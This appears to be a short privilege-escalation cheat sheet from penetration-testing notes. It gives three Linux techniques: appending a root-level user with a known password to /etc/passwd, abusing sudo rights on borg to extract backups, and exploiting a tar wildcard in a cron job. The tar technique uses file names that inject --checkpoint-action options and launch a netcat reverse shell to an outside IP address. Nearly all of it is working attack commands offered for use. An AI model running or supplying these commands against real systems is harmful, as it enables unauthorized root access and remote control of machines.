# Add root user to passwd file (root2:w00t)
```bash
openssl passwd w00t
echo "root2:Fdzt.eqJQ4s0g:0:0:root:/root:/bin/bash" >> /etc/passwd
su root2
Password: w00t
```

-----------------------

# Exploit borg backup
```bash
sudo /usr/bin/borg list *
sudo /usr/bin/borg extract --stdout /opt/borgbackup::home
```
-----------------------

# Abuse tar wildcard ~tar -zxf /tmp/backup.tar.gz *

Saying that cron is the following
cd /opt/admin && tar -zxf /tmp/backup.tar.gz *
```bash
cd /opt/admin
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 192.168.45.169 6666 >/tmp/f" > demo.sh
chmod +x demo.sh
touch -- "--checkpoint-action=exec=sh demo.sh"
touch -- "--checkpoint=1"
```
-----------------------
